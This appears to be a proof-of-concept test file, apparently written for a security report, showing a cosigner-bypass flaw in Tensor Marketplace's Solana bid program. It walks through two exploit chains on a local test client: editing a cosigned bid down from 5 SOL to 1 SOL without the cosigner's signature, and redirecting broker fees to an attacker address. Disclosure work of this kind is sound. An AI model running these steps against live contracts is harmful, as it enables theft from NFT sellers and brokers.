/**
 * PoC: Tensor Marketplace — Cosigner Bypass via Bid Edit + Take Bid Settlement
 *
 * Demonstrates the full attack chain:
 *   1. Buyer places a bid for 5 SOL with a cosigner on an MPL Core asset
 *   2. Buyer edits the bid to 1 SOL WITHOUT the cosigner's signature
 *   3. Seller calls takeBidCore — cosigner signs, settlement occurs at 1 SOL
 *   4. Buyer receives the NFT for 1 SOL instead of 5 SOL
 *
 * Root cause: program/src/instructions/bid.rs edit branch (lines ~112-123)
 *   validates target/target_id/field/field_id immutability but does NOT
 *   re-validate the cosigner. The cosigner field retains its original value,
 *   so take_bid's cosigner check passes against the stale key while enforcing
 *   the manipulated amount.
 *
 * Drop this file into: clients/js/test/mpl_core/bidEditTakeBid.test.ts
 * Run with: pnpm clients:js:test -- --match "PoC*"
 */

import {
  appendTransactionMessageInstruction,
  fetchEncodedAccount,
  generateKeyPairSigner,
  pipe,
} from '@solana/web3.js';
import {
  createDefaultAsset,
  fetchAssetV1,
} from '@tensor-foundation/mpl-core';
import {
  createDefaultSolanaClient,
  createDefaultTransaction,
  generateKeyPairSignerWithSol,
  LAMPORTS_PER_SOL,
  signAndSendTransaction,
} from '@tensor-foundation/test-helpers';
import test from 'ava';
import {
  fetchBidState,
  findBidStatePda,
  getBidInstructionAsync,
  getTakeBidCoreInstructionAsync,
  Target,
} from '../../src/index.js';
import { BASIS_POINTS, getAndFundFeeVault } from '../_common.js';

test('PoC: cosigner bypass — bid edit changes amount without cosigner, take_bid settles at manipulated price', async (t) => {
  const client = createDefaultSolanaClient();

  // ——— Setup actors ———
  const payer = await generateKeyPairSignerWithSol(client);
  const updateAuthority = await generateKeyPairSigner();
  const seller = await generateKeyPairSignerWithSol(client, 2n * LAMPORTS_PER_SOL);
  const buyer = await generateKeyPairSignerWithSol(client, 10n * LAMPORTS_PER_SOL);
  const cosigner = await generateKeyPairSigner(); // the co-approval key
  const creator = await generateKeyPairSigner();

  const ORIGINAL_PRICE = 5n * LAMPORTS_PER_SOL; // 5 SOL
  const MANIPULATED_PRICE = 1n * LAMPORTS_PER_SOL; // 1 SOL
  const royaltyBps = 500; // 5%

  // ——— Step 1: Create an MPL Core asset owned by the seller ———
  t.log('Step 1: Creating MPL Core asset owned by seller...');
  const asset = await createDefaultAsset({
    client,
    authority: updateAuthority,
    owner: seller.address,
    royalties: {
      creators: [{ address: creator.address, percentage: 100 }],
      basisPoints: royaltyBps,
    },
    payer,
  });
  t.log(`  Asset created: ${asset.address}`);

  // Confirm seller owns the asset
  const assetBefore = await fetchAssetV1(client.rpc, asset.address);
  t.is(assetBefore.data.owner, seller.address, 'Seller owns the asset before trade');

  // ——— Step 2: Buyer places a bid for 5 SOL WITH the cosigner ———
  t.log(`Step 2: Buyer places bid for ${ORIGINAL_PRICE / LAMPORTS_PER_SOL} SOL with cosigner...`);
  const bidId = asset.address; // For AssetId target, bidId must equal targetId

  const bidIx = await getBidInstructionAsync({
    owner: buyer,
    amount: ORIGINAL_PRICE,
    target: Target.AssetId,
    targetId: asset.address,
    bidId,
    cosigner, // <-- cosigner co-signs the bid creation
  });

  await pipe(
    await createDefaultTransaction(client, buyer),
    (tx) => appendTransactionMessageInstruction(bidIx, tx),
    (tx) => signAndSendTransaction(client, tx)
  );

  const [bidStatePda] = await findBidStatePda({
    owner: buyer.address,
    bidId,
  });

  // Verify the bid was created with the cosigner and original amount
  const bidAfterCreate = await fetchBidState(client.rpc, bidStatePda);
  t.is(bidAfterCreate.data.amount, ORIGINAL_PRICE, 'Bid amount is 5 SOL');
  t.is(bidAfterCreate.data.cosigner, cosigner.address, 'Cosigner is set');
  t.log(`  Bid created at ${bidStatePda}`);
  t.log(`  Amount: ${bidAfterCreate.data.amount / LAMPORTS_PER_SOL} SOL`);
  t.log(`  Cosigner: ${bidAfterCreate.data.cosigner}`);

  // ——— Step 3: Buyer EDITS the bid to 1 SOL WITHOUT the cosigner ———
  t.log(`Step 3: Buyer edits bid to ${MANIPULATED_PRICE / LAMPORTS_PER_SOL} SOL WITHOUT cosigner...`);

  const editBidIx = await getBidInstructionAsync({
    owner: buyer,
    amount: MANIPULATED_PRICE, // <-- changed from 5 SOL to 1 SOL
    target: Target.AssetId,
    targetId: asset.address,
    bidId,
    // cosigner is OMITTED — the edit branch doesn't require it
  });

  await pipe(
    await createDefaultTransaction(client, buyer),
    (tx) => appendTransactionMessageInstruction(editBidIx, tx),
    (tx) => signAndSendTransaction(client, tx)
  );

  // Verify: amount changed to 1 SOL but cosigner is STILL set to original key
  const bidAfterEdit = await fetchBidState(client.rpc, bidStatePda);
  t.is(bidAfterEdit.data.amount, MANIPULATED_PRICE, 'BUG: Bid amount changed to 1 SOL without cosigner');
  t.is(bidAfterEdit.data.cosigner, cosigner.address, 'Cosigner key unchanged (stale)');
  t.log(`  Amount after edit: ${bidAfterEdit.data.amount / LAMPORTS_PER_SOL} SOL`);
  t.log(`  Cosigner after edit: ${bidAfterEdit.data.cosigner} (unchanged!)`);
  t.log('  >> VULNERABILITY: amount modified without cosigner approval');

  // ——— Step 4: Fund the fee vault for take_bid ———
  await getAndFundFeeVault(client, bidStatePda);

  // ——— Step 5: Seller takes the bid — cosigner signs, settles at 1 SOL ———
  t.log('Step 4: Seller takes the bid with original cosigner — settles at manipulated price...');

  const minAmount = MANIPULATED_PRICE - (MANIPULATED_PRICE * BigInt(royaltyBps)) / BASIS_POINTS;

  // Record balances before settlement
  const buyerBalanceBefore = (await client.rpc.getBalance(buyer.address).send()).value;
  const sellerBalanceBefore = (await client.rpc.getBalance(seller.address).send()).value;

  const takeBidIx = await getTakeBidCoreInstructionAsync({
    seller,
    owner: buyer.address,
    asset: asset.address,
    bidState: bidStatePda,
    minAmount,
    creators: [creator.address],
    cosigner, // <-- cosigner signs take_bid; check passes against stale bid_state.cosigner
    rentDestination: buyer.address,
  });

  await pipe(
    await createDefaultTransaction(client, seller),
    (tx) => appendTransactionMessageInstruction(takeBidIx, tx),
    (tx) => signAndSendTransaction(client, tx)
  );

  // ——— Step 6: Verify the attack outcome ———
  t.log('Step 5: Verifying attack outcome...');

  // 6a. Bid account is closed (trade settled)
  const bidAccountAfter = await fetchEncodedAccount(client.rpc, bidStatePda);
  t.false(bidAccountAfter.exists, 'Bid account closed — trade fully settled');

  // 6b. Buyer now owns the asset
  const assetAfter = await fetchAssetV1(client.rpc, asset.address);
  t.is(assetAfter.data.owner, buyer.address, 'Buyer now owns the NFT');

  // 6c. Confirm settlement price was the manipulated amount (1 SOL, not 5 SOL)
  const buyerBalanceAfter = (await client.rpc.getBalance(buyer.address).send()).value;
  const sellerBalanceAfter = (await client.rpc.getBalance(seller.address).send()).value;

  // Buyer's cost should be ~1 SOL (plus rent refund), NOT 5 SOL
  const buyerSpent = buyerBalanceBefore - buyerBalanceAfter;
  t.log(`  Buyer balance change: -${buyerSpent} lamports`);
  t.log(`  Seller balance change: +${sellerBalanceAfter - sellerBalanceBefore} lamports`);
  t.log(`  Asset owner: ${assetAfter.data.owner}`);

  // The seller received ~1 SOL minus fees, NOT ~5 SOL minus fees
  const sellerReceived = sellerBalanceAfter - sellerBalanceBefore;
  const maxExpectedSellerReceived = MANIPULATED_PRICE; // ~1 SOL (minus taker/creator fees)
  t.true(
    sellerReceived < maxExpectedSellerReceived,
    `Seller received ${sellerReceived} lamports (~${Number(sellerReceived) / Number(LAMPORTS_PER_SOL)} SOL) — manipulated price, not original 5 SOL`
  );
  t.true(
    sellerReceived < ORIGINAL_PRICE / 2n,
    'IMPACT CONFIRMED: Seller received far less than original bid price'
  );

  t.log('');
  t.log('=== ATTACK SUMMARY ===');
  t.log(`  Original bid:     ${ORIGINAL_PRICE / LAMPORTS_PER_SOL} SOL`);
  t.log(`  Manipulated bid:  ${MANIPULATED_PRICE / LAMPORTS_PER_SOL} SOL`);
  t.log(`  Seller received:  ~${Number(sellerReceived) / Number(LAMPORTS_PER_SOL)} SOL`);
  t.log(`  Buyer saved:      ~${Number(ORIGINAL_PRICE - MANIPULATED_PRICE) / Number(LAMPORTS_PER_SOL)} SOL`);
  t.log(`  NFT transferred:  YES (${asset.address})`);
  t.log('  Cosigner bypass:  YES (stale key accepted by take_bid)');
  t.log('======================');

  t.pass('Full attack chain confirmed: edit + take_bid settles at manipulated price');
});

test('PoC: cosigner bypass — maker_broker redirection steals fees', async (t) => {
  const client = createDefaultSolanaClient();

  // ——— Setup actors ———
  const payer = await generateKeyPairSignerWithSol(client);
  const updateAuthority = await generateKeyPairSigner();
  const seller = await generateKeyPairSignerWithSol(client, 2n * LAMPORTS_PER_SOL);
  const buyer = await generateKeyPairSignerWithSol(client, 10n * LAMPORTS_PER_SOL);
  const cosigner = await generateKeyPairSigner();
  const creator = await generateKeyPairSigner();
  const legitimateBroker = await generateKeyPairSignerWithSol(client);
  const attackerBroker = await generateKeyPairSignerWithSol(client); // attacker-controlled

  const price = 5n * LAMPORTS_PER_SOL;
  const royaltyBps = 500;

  // Step 1: Create asset
  const asset = await createDefaultAsset({
    client,
    authority: updateAuthority,
    owner: seller.address,
    royalties: {
      creators: [{ address: creator.address, percentage: 100 }],
      basisPoints: royaltyBps,
    },
    payer,
  });

  // Step 2: Create bid with legitimate maker_broker + cosigner
  t.log('Creating bid with legitimate maker_broker and cosigner...');
  const bidId = asset.address;

  const bidIx = await getBidInstructionAsync({
    owner: buyer,
    amount: price,
    target: Target.AssetId,
    targetId: asset.address,
    bidId,
    cosigner,
    makerBroker: legitimateBroker.address,
  });

  await pipe(
    await createDefaultTransaction(client, buyer),
    (tx) => appendTransactionMessageInstruction(bidIx, tx),
    (tx) => signAndSendTransaction(client, tx)
  );

  const [bidStatePda] = await findBidStatePda({
    owner: buyer.address,
    bidId,
  });

  const bidAfterCreate = await fetchBidState(client.rpc, bidStatePda);
  t.is(bidAfterCreate.data.makerBroker, legitimateBroker.address, 'Legitimate broker set');
  t.log(`  maker_broker: ${bidAfterCreate.data.makerBroker}`);

  // Step 3: Edit bid — redirect maker_broker to attacker WITHOUT cosigner
  t.log('Editing bid to redirect maker_broker to attacker...');

  const editBidIx = await getBidInstructionAsync({
    owner: buyer,
    amount: price, // keep same price
    target: Target.AssetId,
    targetId: asset.address,
    bidId,
    makerBroker: attackerBroker.address, // <-- attacker's address
    // NO cosigner
  });

  await pipe(
    await createDefaultTransaction(client, buyer),
    (tx) => appendTransactionMessageInstruction(editBidIx, tx),
    (tx) => signAndSendTransaction(client, tx)
  );

  const bidAfterEdit = await fetchBidState(client.rpc, bidStatePda);
  t.is(bidAfterEdit.data.makerBroker, attackerBroker.address, 'BUG: maker_broker redirected without cosigner');
  t.is(bidAfterEdit.data.cosigner, cosigner.address, 'Cosigner unchanged');
  t.log(`  maker_broker after edit: ${bidAfterEdit.data.makerBroker} (ATTACKER)`);

  // Step 4: Take bid — maker_broker fee goes to attacker
  await getAndFundFeeVault(client, bidStatePda);

  const attackerBalanceBefore = (await client.rpc.getBalance(attackerBroker.address).send()).value;
  const legitimateBrokerBalanceBefore = (await client.rpc.getBalance(legitimateBroker.address).send()).value;

  const minAmount = price - (price * BigInt(royaltyBps)) / BASIS_POINTS;

  const takeBidIx = await getTakeBidCoreInstructionAsync({
    seller,
    owner: buyer.address,
    asset: asset.address,
    bidState: bidStatePda,
    minAmount,
    creators: [creator.address],
    cosigner,
    makerBroker: attackerBroker.address,
    rentDestination: buyer.address,
  });

  await pipe(
    await createDefaultTransaction(client, seller),
    (tx) => appendTransactionMessageInstruction(takeBidIx, tx),
    (tx) => signAndSendTransaction(client, tx)
  );

  // Verify: attacker received maker_broker fees, legitimate broker got nothing
  const attackerBalanceAfter = (await client.rpc.getBalance(attackerBroker.address).send()).value;
  const legitimateBrokerBalanceAfter = (await client.rpc.getBalance(legitimateBroker.address).send()).value;

  const attackerGain = attackerBalanceAfter - attackerBalanceBefore;
  const legitimateBrokerGain = legitimateBrokerBalanceAfter - legitimateBrokerBalanceBefore;

  t.log('');
  t.log('=== BROKER REDIRECTION RESULT ===');
  t.log(`  Attacker broker received:    ${attackerGain} lamports`);
  t.log(`  Legitimate broker received:  ${legitimateBrokerGain} lamports`);
  t.log('=================================');

  t.true(attackerGain > 0n, 'IMPACT: Attacker received maker_broker fees');
  t.is(legitimateBrokerGain, 0n, 'Legitimate broker received nothing');

  t.pass('Maker broker redirection confirmed: fees stolen without cosigner approval');
});
